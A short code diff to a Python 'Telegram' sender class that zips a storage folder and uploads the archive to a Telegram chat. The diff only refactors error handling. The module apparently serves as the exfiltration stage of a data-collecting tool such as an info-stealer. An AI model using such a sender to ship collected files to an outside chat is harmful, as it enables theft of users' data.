@@ -22,7 +22,7 @@ class Telegram(AbstractSender):
         :return: (str|bytes, ...)
         """
         with open(rf"{path.dirname(self.__storage_path)}\{self.__zip_name}.zip", "rb") as file:
-            content_type, body = MultipartFormDataEncoder(self.__errors).encode(
+            content_type, body = MultipartFormDataEncoder().encode(
                 [("chat_id", self.__user_id)],
                 [("document", f"{self.__zip_name}.zip", file)]
             )
@@ -44,21 +44,19 @@ class Telegram(AbstractSender):
 
         urlopen(query)
 
-    def run(self, zip_name: str, storage_path: str, errors: bool) -> None:
+    def run(self, zip_name: str, storage_path: str) -> None:
         """
         Launches the sender module.
         :param zip_name: str
         :param storage_path: str
-        :param errors: bool
         :return: None
         """
         self.__zip_name = zip_name
         self.__storage_path = storage_path
-        self.__errors = errors
 
         try:
 
             self.__send_archive()
 
         except Exception as e:
-            if self.__errors is True: print(f"[Sender]: {repr(e)}")
+            print(f"[Telegram sender]: {repr(e)}")
